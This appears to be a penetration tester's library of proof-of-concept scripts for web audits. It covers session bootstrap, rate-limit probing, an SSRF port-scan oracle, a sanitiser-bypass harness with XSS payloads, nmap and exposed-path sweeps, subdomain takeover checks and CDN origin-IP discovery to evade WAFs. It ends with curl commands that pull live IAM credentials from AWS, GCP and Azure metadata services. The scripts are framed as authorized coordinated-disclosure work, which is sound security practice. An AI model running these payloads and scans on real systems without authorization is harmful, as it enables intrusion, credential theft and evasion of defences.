# PoC Templates

Reusable Python + Node snippets for coordinated-disclosure engagements. All examples are intentionally vanilla — no custom dependencies beyond `requests`, `urllib3`, and optionally `jsdom` + `dompurify` for sanitiser harnesses.

Adapt the `BASE`, cookie name (`session`, `__Secure-session_token`, etc.), and endpoint paths for each target. Every script is opinionated about rate-limiting itself; keep the `time.sleep(...)` calls in place.

## 1. Authenticated probe bootstrap

Signs up a throwaway account, captures the session cookie (handling the `__Secure-` prefix correctly), and pickles it for reuse across scripts.

```python
#!/usr/bin/env python3
"""Bootstrap a researcher session on the target. Pickles creds to /tmp."""
import requests, pickle, uuid, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
SIGNUP_PATH = "/api/auth/sign-up/email"   # adapt to target's auth framework
SIGNIN_PATH = "/api/auth/sign-in/email"

H = {
    "User-Agent": "security-research/1.0 (authorized audit — {SCOPE REFERENCE})",
    "Origin": BASE,   # many Better-Auth endpoints reject missing Origin
    "Referer": BASE + "/",
}

uid = uuid.uuid4().hex[:8]
email = f"security-research-{uid}@pentest.test"
username = f"secr-{uid}"
password = "SecResearch-1337!"

s = requests.Session(); s.headers.update(H); s.verify = False

r = s.post(BASE + SIGNUP_PATH,
           json={"email": email, "password": password, "name": "Researcher", "username": username},
           headers={"Content-Type": "application/json"},
           timeout=15)
assert r.status_code == 200, f"signup failed: {r.status_code}  {r.text[:300]}"

# Better-Auth sometimes returns a session cookie on signup; if not, sign in
if not any("session" in c.name.lower() for c in s.cookies):
    r = s.post(BASE + SIGNIN_PATH,
               json={"email": email, "password": password},
               headers={"Content-Type": "application/json"},
               timeout=10)
    assert r.status_code == 200, f"signin failed: {r.status_code}  {r.text[:300]}"

pickle.dump({
    "email": email, "username": username, "password": password, "uid": uid,
    "cookies": requests.utils.dict_from_cookiejar(s.cookies),
}, open(f"/tmp/creds-{uid}.pkl", "wb"))
print(f"[+] session cookies: {[c.name for c in s.cookies]}")
print(f"[+] creds pickled → /tmp/creds-{uid}.pkl")
```

### Cookie-restore loader

Every follow-on probe starts with:

```python
import requests, pickle, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

creds = pickle.load(open("/tmp/creds-XXXXXXXX.pkl", "rb"))
s = requests.Session()
s.headers.update({
    "User-Agent": "security-research/1.0 (authorized audit)",
    "Origin": "https://TARGET.example",
})
s.verify = False
for k, v in creds["cookies"].items():
    s.cookies.set(k, v, domain="TARGET.example", secure=True)

# Optional: re-sign-in if the session expired
r = s.post("https://TARGET.example/api/auth/sign-in/email",
           json={"email": creds["email"], "password": creds["password"]},
           headers={"Content-Type": "application/json"}, timeout=10)
```

## 2. Snapshot probe (living-target detection)

Run at the start of every verification round. Diff the JSON output against the prior round to catch silent maintainer patches.

```python
#!/usr/bin/env python3
"""Before each verification round, capture the current defensive posture."""
import requests, json, time, urllib3
from collections import Counter
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
H = {"User-Agent": "security-research/1.0 (authorized audit)"}

def probe_headers(path="/"):
    r = requests.get(BASE + path, headers=H, timeout=10, verify=False, allow_redirects=False)
    return {k: v[:100] for k, v in r.headers.items()
            if k.lower() in {
                "content-security-policy", "content-security-policy-report-only",
                "strict-transport-security", "x-frame-options",
                "x-content-type-options", "referrer-policy", "permissions-policy",
                "cross-origin-opener-policy", "cross-origin-embedder-policy",
                "cross-origin-resource-policy",
            }}

def count_status(endpoint, n=10, sleep=0.3):
    codes = []
    for _ in range(n):
        r = requests.post(BASE + endpoint,
                          json={"email": "nobody@pentest.test", "password": "wrong"},
                          headers={"Content-Type": "application/json"},
                          timeout=8, verify=False)
        codes.append(r.status_code)
        time.sleep(sleep)
    return dict(Counter(codes))

def resolve_origin(hostname):
    # customize for your target — this is just an example
    import socket
    try: return socket.gethostbyname(hostname)
    except: return None

def probe_health(path="/api/health"):
    r = requests.get(BASE + path, headers=H, timeout=10, verify=False)
    try: return r.json()
    except: return r.text[:200]

snapshot = {
    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "headers_root": probe_headers("/"),
    "sign_in_status_codes": count_status("/api/auth/sign-in/email", n=10),
    "resolved_ip": resolve_origin("TARGET.example"),
    "health_echo": probe_health(),
}
fname = f"/tmp/snapshot-{int(time.time())}.json"
open(fname, "w").write(json.dumps(snapshot, indent=2, default=str))
print(f"[+] snapshot → {fname}")
# Compare: diff /tmp/snapshot-<T1>.json /tmp/snapshot-<T2>.json
```

## 3. Rate-limit posture measurement

```python
#!/usr/bin/env python3
"""Categorize a rate-limit as none / partial / strong. Always sleep ≥60s
between runs against the same endpoint so earlier probes don't pollute."""
import requests, time, urllib3
from collections import Counter
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
H = {"User-Agent": "security-research/1.0 (authorized audit)"}

def measure(endpoint, body_fn, n=20, label=""):
    codes = []
    t0 = time.time()
    for i in range(n):
        r = requests.post(BASE + endpoint, json=body_fn(i),
                          headers={**H, "Content-Type": "application/json"},
                          timeout=8, verify=False)
        codes.append(r.status_code)
    dt = time.time() - t0
    cnt = Counter(codes)
    first_429 = next((i for i, c in enumerate(codes) if c == 429), None)

    if cnt.get(429, 0) == 0:
        state = "NOT_MITIGATED"
    elif first_429 is not None and first_429 <= 3:
        state = "STRONG"
    elif first_429 is not None and first_429 <= 9:
        state = "PARTIAL"
    else:
        state = "WEAK"

    print(f"[{label or endpoint}] {n} attempts / {dt:.1f}s → {dict(cnt)}; "
          f"first 429 at #{first_429}; state={state}")
    return state, cnt, first_429

measure("/api/auth/sign-in/email",
        lambda i: {"email": "nobody@pentest.test", "password": f"wrong{i}"},
        n=20, label="sign-in/email")

# Wait for bucket drain before another endpoint
time.sleep(75)

measure("/api/auth/request-password-reset",
        lambda i: {"email": "victim@pentest.test"},
        n=10, label="request-password-reset")
```

## 4. SSRF error-shape oracle

Probe an outbound-URL-accepting endpoint with a matrix of targets. The distinct error-string classes expose internal-network topology.

```python
#!/usr/bin/env python3
"""Map internal topology via SSRF error shapes. Requires an authenticated
endpoint that accepts a user-supplied URL (AI baseURL, webhook, image url)."""
import requests, pickle, urllib3, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://TARGET.example"
H = {"User-Agent": "security-research/1.0 (authorized audit)", "Origin": BASE}
# Load session from bootstrap script
creds = pickle.load(open("/tmp/creds-XXXXXXXX.pkl", "rb"))
s = requests.Session(); s.headers.update(H); s.verify = False
# (cookie restore + re-signin as in section 1)

TARGETS = [
    ("external OK",             "https://example.com"),
    ("external 404",            "https://example.com/nonexistent"),
    ("localhost / app",         "http://localhost:3000"),
    ("localhost / common db",   "http://localhost:5432"),
    ("localhost / common cache","http://localhost:6379"),
    ("swarm svc / postgres",    "http://postgres:5432"),
    ("swarm svc / redis",       "http://redis:6379"),
    ("swarm svc / worker",      "http://worker:3000"),
    ("closed port",             "http://localhost:65500"),
    ("nonexistent host",        "http://nonexistent-{uuid}.test:80"),
    ("cloud metadata",          "http://169.254.169.254/metadata/v1/"),
    ("RFC1918 private",         "http://10.0.0.1"),
]

for label, url in TARGETS:
    try:
        r = s.post(BASE + "/api/AUTH_URL_ACCEPTING_ENDPOINT",
                   json={"baseURL": url, "apiKey": "sk-fake", "provider": "openai"},
                   headers={"Content-Type": "application/json"},
                   timeout=12)
        # extract the inner error string; differ per framework
        try: msg = r.json().get("message") or r.json().get("json", {}).get("message", "")
        except: msg = r.text
        print(f"  {label:30} [{r.status_code}]  msg={msg[:130]}")
    except Exception as e:
        print(f"  {label:30} ERR  {str(e)[:80]}")
    time.sleep(0.5)

# Interpretation (classic):
#   ENOTFOUND         → DNS failed (host not in container's resolver)
#   ECONNREFUSED      → host up, no listener on that port
#   "other side closed" / "Connection reset" → TCP OK, protocol mismatch (DB wire)
#   "Not Found" / 404 → HTTP reachable, no matching route
#   timeout           → filtered / offline (or target is genuinely slow)
# 4+ distinct classes = you have a blind-SSRF port-scan primitive.
```

### Version fingerprint via content-echoing SSRF

If the target accepts a URL whose response body gets returned (for example, a media-URL field that the server fetches and base64-encodes as a data URL in the JSON response), point it at the server's own `/health` / `/status` / `/metrics` endpoint.

```python
# Step 1 — update the object to set the attacker-controlled URL to an internal
# version-echo endpoint. Adapt the patch path / endpoint / method to the target.
patch_body = {"json": {"id": RESOURCE_ID, "operations": [
    {"op": "replace", "path": "/media/href",
     "value": "http://localhost:3000/api/health"}
]}}
s.post(BASE + "/api/rpc/resource/patch", json=patch_body,
       headers={"Content-Type": "application/json"}, timeout=10)

# Step 2 — call the endpoint that echoes the fetched body back. If this is
# unauthenticated (because of a separate access-control bug), great; otherwise
# reuse the authed session from step 1.
r = requests.post(BASE + "/api/rpc/resource/getAndFetch",
                  json={"json": {"id": RESOURCE_ID}},
                  headers={"Content-Type": "application/json"},
                  timeout=20, verify=False)
url = r.json().get("json", {}).get("data", {}).get("media", {}).get("href", "")
if url.startswith("data:"):
    import base64
    _, _, b64 = url.partition(",")
    print(base64.b64decode(b64[:6000]).decode("utf-8", "replace"))
# Look for Node/Chrome/V8/DB/library versions in the echoed JSON.
# Cross-reference vs the upstream project's latest stable release.
```

## 5. Sanitiser-bypass harness (DOMPurify or similar)

**The wrong test:** regex-search the output for `<script>` / `javascript:`. Misses mutation bypasses.

**The right test:** parse the sanitised output with JSDOM and ask: did any `<script>` element survive, any attribute starting with `on`, any `javascript:` URL in href/src?

```js
// test-mxss.mjs — run inside the target repo so resolver picks up deps
// From a clean /tmp: mkdir tmp-probe && cd tmp-probe && npm init -y && npm i dompurify jsdom
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const purify = DOMPurify(new JSDOM('').window);

// Load the *exact* config used by the target (copy verbatim from the repo)
const CFG = {
  ALLOWED_TAGS: ["p","br","span","div","strong","em","u","s","a","ul","ol","li","blockquote","code","pre"],
  ALLOWED_ATTR: ["class","style","href","target","rel"],
  ALLOWED_URI_REGEXP: /^(?:(?:https?):\/\/|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  RETURN_TRUSTED_TYPE: false,
};

// Published and variant mXSS payloads
const payloads = [
  `<img src=x onerror=alert(1)>`,
  `<script>alert(1)</script>`,
  `<svg onload=alert(1)>`,
  `<iframe src="javascript:alert(1)">`,
  `<a href="javascript:alert(1)">click</a>`,
  `<a href="data:text/html,<script>alert(1)</script>">click</a>`,
  `<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>`,
  `<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">`,
  `<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
  `<a href="java\tscript:alert(1)">click</a>`,
  `<a href="java\nscript:alert(1)">click</a>`,
  `<p oNcLiCk="alert(1)">x</p>`,
  `<template><img src=x onerror=alert(1)></template>`,
  `<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>`,
];

let leaks = 0;
for (const p of payloads) {
  const out = purify.sanitize(p, CFG);
  const doc = new JSDOM(`<body>${out}</body>`).window.document;
  const scripts = doc.querySelectorAll('script').length;
  let handlers = 0, jsUrls = 0;
  for (const el of doc.body.getElementsByTagName('*')) {
    for (const attr of el.attributes) {
      if (attr.name.startsWith('on')) handlers++;
    }
    for (const a of ['href','src']) {
      const v = el.getAttribute(a);
      if (v && /^\s*javascript\s*:/i.test(v)) jsUrls++;
    }
  }
  if (scripts || handlers || jsUrls) {
    leaks++;
    console.log(`BYPASS: [${scripts}s/${handlers}h/${jsUrls}j] ${p.slice(0,80)}`);
    console.log(`        → ${out.slice(0,160)}`);
  }
}
console.log(`\nDOMPurify ${DOMPurify.version}: ${payloads.length - leaks}/${payloads.length} clean`);
```

## 6. Security-headers audit

Dump full headers — **don't** pattern-match. Subtle cases: `Content-Security-Policy-Report-Only` ≠ `Content-Security-Policy`, `/uploads/*` often has different headers than `/`.

```python
#!/usr/bin/env python3
import requests, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
H = {"User-Agent": "security-research/1.0 (authorized audit)"}

HEADERS = [
    "content-security-policy", "content-security-policy-report-only",
    "strict-transport-security", "x-frame-options", "x-content-type-options",
    "referrer-policy", "permissions-policy",
    "cross-origin-opener-policy", "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
]

SURFACES = [
    ("homepage",      "https://TARGET.example/"),
    ("login",         "https://TARGET.example/auth/login"),
    ("dashboard",     "https://TARGET.example/dashboard"),
    ("rpc endpoint",  "https://TARGET.example/api/rpc/"),
    ("upload route",  "https://TARGET.example/uploads/x/y.webp"),
    ("http redirect", "http://TARGET.example/"),
]

for label, url in SURFACES:
    r = requests.get(url, headers=H, timeout=10, verify=False, allow_redirects=False)
    print(f"=== {label} [{r.status_code}] ===")
    for h in HEADERS:
        v = r.headers.get(h)
        mark = "✗ MISSING" if v is None else f"✓ {v[:90]}"
        print(f"  {h:35} {mark}")
    print()

# After dumping: classify each header as enforced / report-only / missing
# DO NOT conclude "all missing" from a single probe — reconfirm with curl -sI
# in a separate shell before writing it up.
```

## 7. Advisory edit loop

```bash
#!/usr/bin/env bash
set -euo pipefail

ADV="GHSA-xxxx-xxxx-xxxx"
REPO="OWNER/REPO"

# 1. Check current state
gh api /repos/$REPO/security-advisories/$ADV \
  --jq '{state, updated_at, desc_len: (.description | length), cwe_ids}'

# 2. Pull in-place (don't accumulate v1/v2/v3 files)
gh api /repos/$REPO/security-advisories/$ADV --jq '.description' > /tmp/advisory.md

# 3. Edit /tmp/advisory.md with your editor of choice
${EDITOR:-vi} /tmp/advisory.md

# 4. Build PATCH payload (Python avoids quote-escaping issues)
python3 - <<'PY'
import json
desc = open('/tmp/advisory.md').read()
open('/tmp/patch.json','w').write(json.dumps({
  'description': desc,
  'cwe_ids': ['CWE-200','CWE-284','CWE-307','CWE-918'],  # edit to match
}))
print(f'payload bytes: {len(json.dumps({"description": desc}))}')
PY

# 5. PATCH
gh api -X PATCH /repos/$REPO/security-advisories/$ADV \
  --input /tmp/patch.json \
  --jq '{updated_at, desc_len: (.description | length), state}'
```

## 8. Patch-set export for advisory inlining

```bash
#!/usr/bin/env bash
# After committing to a local branch off origin/main:
set -euo pipefail
BASE_SHA=$(git rev-parse origin/main)
OUT=./patches
mkdir -p $OUT

# ALWAYS use a SHA range, never `-N` (picks wrong commits when base is far back)
git format-patch $BASE_SHA..HEAD -o $OUT
ls -la $OUT

# Build the advisory snippet
{
  echo "### Proposed patches (on \`main\` @ $BASE_SHA)"
  echo
  echo "Apply with:"
  echo '```bash'
  for p in $OUT/*.patch; do
    echo "git am < $(basename $p)"
  done
  echo '```'
  echo
  for p in $OUT/*.patch; do
    echo "<details><summary>$(basename $p)</summary>"
    echo
    echo '```patch'
    cat "$p"
    echo '```'
    echo
    echo "</details>"
    echo
  done
} > /tmp/patch_section.md

echo "patch_section bytes: $(wc -c < /tmp/patch_section.md)"
# Append this to /tmp/advisory.md before PATCH-ing.
```

## 9. Cleanup rituals

```bash
# After the engagement, before closing the session:
cd <target-repo>
git status                          # expect clean
git log --oneline origin/main..HEAD  # expect your commits only

# Local probe artefacts to preserve with PII redacted:
ls /tmp/*pentest* /tmp/*creds* /tmp/*snapshot* /tmp/advisory*.md

# Local probe artefacts safe to delete:
rm /tmp/patch_*.json /tmp/scalar.html /tmp/probe_*.py
```

## Opinionated defaults (copy-paste for every probe script)

```python
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

H = {"User-Agent": "security-research/1.0 (authorized audit — {SCOPE_REF})"}
# Every requests.* call:
requests.get(URL, headers=H, timeout=10, verify=False)
# or sessions with s.verify = False

import time
RATE = 0.35  # seconds between requests → ~3/sec
```

If you find yourself writing `threads=` or `asyncio.gather` anywhere in a probe, stop. Research-grade probes are single-threaded by default; concurrency is for the maintainer's penetration team, not yours.


## 10. Server / port sweep

Run only against hosts explicitly in scope.

```bash
#!/usr/bin/env bash
# server-sweep.sh — one-shot infra audit for a hostname in scope
set -u
HOST="${1:?usage: $0 hostname}"

echo "=== A/AAAA ==="
dig +short A "$HOST" AAAA "$HOST"

echo "=== MX / TXT / NS ==="
dig +short MX "$HOST" TXT "$HOST" NS "$HOST"

echo "=== SPF / DMARC ==="
dig +short TXT "$HOST" | grep -iE 'v=spf1'
dig +short TXT "_dmarc.$HOST"

echo "=== CAA ==="
dig +short CAA "$HOST"

echo "=== nmap top-200 + version ==="
# -Pn: don't ping first (many hosts drop ICMP)
# -T3: polite timing
nmap -sS -sV -Pn -T3 --top-ports 200 "$HOST" 2>/dev/null | tail -40

echo "=== Management + admin ports ==="
# 2375=Docker, 2377=Swarm, 5432=PG, 6379=Redis, 27017=Mongo, 9200=Elastic
# 6443=K8s API, 10250=kubelet, 11211=Memcached
# 8080/9090=Traefik/Prometheus/Jenkins/Grafana admin
nmap -sV -sC -Pn -T3 \
  -p 22,2375,2376,2377,5432,6379,8080,9090,9200,6443,10250,11211,27017,5601,8888 \
  "$HOST" 2>/dev/null | grep -v 'closed\|filtered' | tail -40

echo "=== TLS (openssl one-shot) ==="
echo | timeout 5 openssl s_client -connect "$HOST:443" -servername "$HOST" 2>&1 \
  | openssl x509 -noout -dates -issuer -subject 2>/dev/null

echo "=== HTTP security headers ==="
curl -sI -L "https://$HOST/" | grep -iE \
  'content-security|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy|cross-origin'

echo "=== Common exposed paths ==="
for p in .git/config .git/HEAD .env .env.bak config.json backup.sql dump.sql \
         swagger.json openapi.json swagger-ui admin wp-admin phpinfo.php \
         metrics health healthz actuator actuator/env actuator/heapdump \
         graphql api/reference api/docs .well-known/security.txt \
         server-status robots.txt rails/info/routes telescope horizon \
         _ignition/execute-solution; do
  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "https://$HOST/$p")
  # Only print non-404, non-000
  case "$code" in
    200|301|302|401|403) printf '  %-35s %s\n' "$p" "$code" ;;
  esac
done
```

Run as `./server-sweep.sh target.example`. Each section is self-contained; comment out any block that's out-of-scope.

## 11. TLS configuration audit

```bash
# Best single-tool audit — runs testssl.sh in a container, no install needed
docker run --rm -ti drwetter/testssl.sh --fast --color 0 https://target.example

# Quick manual check if you don't have docker
for proto in tls1 tls1_1 tls1_2 tls1_3; do
  printf '%-10s ' "$proto"
  echo | openssl s_client -connect target.example:443 -servername target.example -"$proto" 2>&1 \
    | grep -E 'Protocol|Cipher' | head -2 | tr '\n' ' '
  echo
done

# Cert expiry + issuer
echo | openssl s_client -connect target.example:443 -servername target.example 2>/dev/null \
  | openssl x509 -noout -dates -subject -issuer

# Full cert chain
echo | openssl s_client -connect target.example:443 -servername target.example -showcerts 2>/dev/null
```

Red flags:
- `tls1` or `tls1_1` accepted (anything below TLS 1.2)
- Cipher list includes `RC4`, `3DES`, `EXPORT`, `NULL`, or `anon`
- Certificate valid more than 398 days (CA/B Forum max)
- Certificate issued by an unexpected CA
- Missing `HSTS` with `preload` directive
- Wildcard cert covering a parent domain broader than needed

## 12. DNS / subdomain takeover

```bash
# Certificate transparency — all subdomains a CA has ever issued for
curl -s "https://crt.sh/?q=%25.example.com&output=json" \
  | jq -r '.[].name_value' | tr '\n' ','  | tr ',' '\n' | sort -u > subdomains.txt
wc -l subdomains.txt

# For each subdomain, resolve and identify CNAME targets that don't respond
while read sub; do
  cname=$(dig +short CNAME "$sub" | head -1)
  [ -z "$cname" ] && continue
  # Check if CNAME resolves and the service responds
  addr=$(dig +short A "$cname" | head -1)
  if [ -z "$addr" ]; then
    echo "DANGLING CNAME: $sub -> $cname (target does not resolve)"
    continue
  fi
  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "https://$sub/")
  if [ "$code" = "404" ] || [ "$code" = "000" ]; then
    # Classic takeover signatures from providers
    body=$(curl -sk --max-time 5 "https://$sub/" | head -c 500)
    case "$body" in
      *"There isn't a GitHub Pages site here"*) echo "TAKEOVER (GitHub Pages): $sub -> $cname" ;;
      *"No such app"*)                          echo "TAKEOVER (Heroku): $sub -> $cname" ;;
      *"The specified bucket does not exist"*) echo "TAKEOVER (S3): $sub -> $cname" ;;
      *"Fastly error: unknown domain"*)         echo "TAKEOVER (Fastly): $sub -> $cname" ;;
      *"NoSuchBucket"*)                         echo "TAKEOVER (S3 alt): $sub -> $cname" ;;
    esac
  fi
done < subdomains.txt
```

Subdomain takeover = attacker registers the missing resource (a fresh GitHub Pages site, Heroku app, S3 bucket) named to match the dangling CNAME. Now they serve content from `subdomain.your-company.com` — phish, steal cookies scoped to the parent domain (if the cookie doesn't set a narrow path), bypass CSP `allowed-origins` that list the subdomain.

## 13. Origin IP discovery (CDN / WAF bypass)

If target is behind Cloudflare / Akamai / Cloudfront / Fastly, hunt for the origin IP — once found, every edge rate-limit and WAF rule becomes optional.

```bash
# Method 1: Certificate Transparency — origin sometimes serves its cert direct
curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[].name_value' | sort -u

# Method 2: Historical DNS records (ViewDNS, SecurityTrails, Shodan InternetDB)
curl -s "https://internetdb.shodan.io/$(dig +short example.com | head -1)"
# And lookup non-CDN A records historically — before the CDN was introduced
curl -s "https://viewdns.info/iphistory/?domain=example.com"   # scrape if needed

# Method 3: Mail headers — send mail TO example.com and inspect Received: chain
# (mail server is often not behind the CDN)

# Method 4: SSRF callback — if the target has an SSRF bug, the Remote-Addr on
# your canary is the origin IP

# Method 5: Direct-origin confirm once suspected
curl --resolve example.com:443:1.2.3.4 https://example.com/api/health -k -v
# If the response matches the live backend, CDN is bypassed
```

Once origin IP is known:
- All CDN-layer rate limits are moot — score as High
- Origin firewall should accept TLS only from published CDN IP ranges (Cloudflare, Akamai, Fastly, Cloudfront publish theirs)
- Recommend IP rotation as part of the fix

## 14. Cloud metadata via SSRF

Only reachable from INSIDE the target's network — but SSRF puts you there. Cheat sheet of the endpoints each cloud exposes:

```bash
# AWS IMDSv1 (legacy, often still on)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → list of roles; then:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# → AccessKeyId, SecretAccessKey, Token

# AWS IMDSv2 (required on newer instances)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# DigitalOcean
curl -s http://169.254.169.254/metadata/v1/user-data
curl -s http://169.254.169.254/metadata/v1/id
# user-data is often where startup scripts (with credentials) are passed in
```

If SSRF echoes response bodies to the caller, pointing at these yields **live cloud credentials**. That's Critical — attacker can spin up infra on your account, read your S3 buckets, decrypt your secrets.

Defence: IMDSv2 (forces PUT-then-GET), egress firewall from app containers to `169.254.0.0/16`, and an SSRF-safe HTTP client in every outbound-fetch call site.
